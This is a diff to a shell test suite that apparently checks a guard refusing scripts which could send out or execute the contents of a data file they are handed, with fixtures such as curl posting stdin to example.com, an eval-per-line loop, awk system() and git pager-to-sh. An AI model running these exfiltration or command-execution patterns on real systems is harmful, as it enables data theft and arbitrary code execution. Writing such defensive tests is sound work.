@@ -666,8 +666,13 @@ printf '%s\n' "$J" '(() => {}).constructor(m.text)();' > "$T/dj/ctor.js"
 printf '%s\n' 'const request = require("request");' 'module.exports = (u) => request.post(u);' > "$T/dj/lib-req.js"
 printf '%s\n' 'const send = require("./lib-req.js");' "$J" 'send(m.url);' > "$T/dj/via.js"
 printf '%s\n' "$J" 'require(m.text);' > "$T/dj/dyn.js"
-for acts in "req.js:(request)" "worker.mjs:(node:worker_threads)" "dns.js:(dns)" "writes.js:writeFileSync" "ctor.js:constructor" \
-  "via.js:request" "dyn.js:require"; do
+# A word the old hand list named still refuses as it did, so nothing refused before passes now (13 of
+# 268 real scripts measured on 2026-11-07 were refused only by one, `got` among them).
+printf '%s\n' "$J" 'const got = m.text.length;' 'console.log(got);' > "$T/dj/words.js"
+printf '%s\n' 'import { readFileSync } from "node:fs";' 'import { cp } from "node:fs/promises";' \
+  'const m = JSON.parse(readFileSync(process.argv[2], "utf8"));' 'await cp(process.argv[2], m.text);' > "$T/dj/cp.mjs"
+for acts in "cp.mjs:(cp)" \ "req.js:(request)" "worker.mjs:(node:worker_threads)" "dns.js:(dns)" "writes.js:writeFileSync" "ctor.js:constructor" \
+  "via.js:request" "dyn.js:require" "words.js:(got)"; do
   run_bash "cd $T/dj && node ${acts%%:*} msg.json"
   refused "a JavaScript script that can act on what it is handed, handed a data file naming the endpoint: ${acts%%:*}"
   says "that refusal names what lets ${acts%%:*} act" "${acts#*:}"
@@ -681,6 +686,12 @@ printf '%s\n' '// const request = require("request"); was the old way' 'import {
   'process.stdout.write(fmt(path.basename(process.argv[2]) + " " + m.text) + "\n");' > "$T/dj/show.mjs"
 run_bash "cd $T/dj && node show.mjs msg.json"
 allowed "a JavaScript script importing only modules that cannot act, handed a data file naming the endpoint"
+# A function of the script's own named like an fs method (repo-digest's format.ts has a link()) is not
+# fs's when the script imports no fs.
+printf '%s\n' 'const link = (u, t) => `<${u}|${t}>`;' 'process.stdin.on("data", (b) => console.log(link(process.argv[2], String(b))));' \
+  > "$T/dj/fmt-link.js"
+run_bash "cd $T/dj && node fmt-link.js msg.json"
+allowed "a script calling its own link(), importing no fs, handed a data file naming the endpoint"
 cp "$T/ds/titles.js" "$T/dj/titles.js"
 cp "$T/ds/post.mjs" "$T/dj/sender.js"
 printf '%s\n' '#!/bin/bash' 'msg="$1"' 'gh api -X POST /repos/x/y/dispatches --input "$msg"' > "$T/dj/gh.sh"
@@ -694,8 +705,9 @@ printf '%s\n' '#!/bin/bash' 'awk '"'"'{ system("curl -d @- " $0) }'"'"' "$1"' > 
 printf '%s\n' '#!/bin/bash' 'find "$(dirname "$1")" -name "*.json" -exec sh {} \;' > "$T/dj/find.sh"
 printf '%s\n' '#!/bin/bash' 'git -c core.pager=sh log --format=%s -- "$1"' > "$T/dj/git.sh"
 printf '%s\n' '#!/bin/bash' 'out="$(printf "%s" "$1" | \' '  curl -s -d @- https://example.com/x)"' > "$T/dj/cont.sh"
+printf '%s\n' '#!/bin/bash' 'while read -r line; do eval "$line"; done < "$1"' > "$T/dj/loop.sh"
 for acts in "gh.sh:(gh)" "nc.sh:(nc)" "hand-js.sh:sender.js" "hand-py.sh:send.py" "awk.sh:(awk)" "find.sh:(find)" \
-  "git.sh:(git)" "cont.sh:(curl)"; do
+  "git.sh:(git)" "cont.sh:(curl)" "loop.sh:loop"; do
   run_bash "cd $T/dj && bash ${acts%%:*} msg.json"
   refused "a shell script handing its argument to a program that can act, handed a data file naming the endpoint: ${acts%%:*}"
   says "that refusal names the program ${acts%%:*} hands it to" "${acts#*:}"
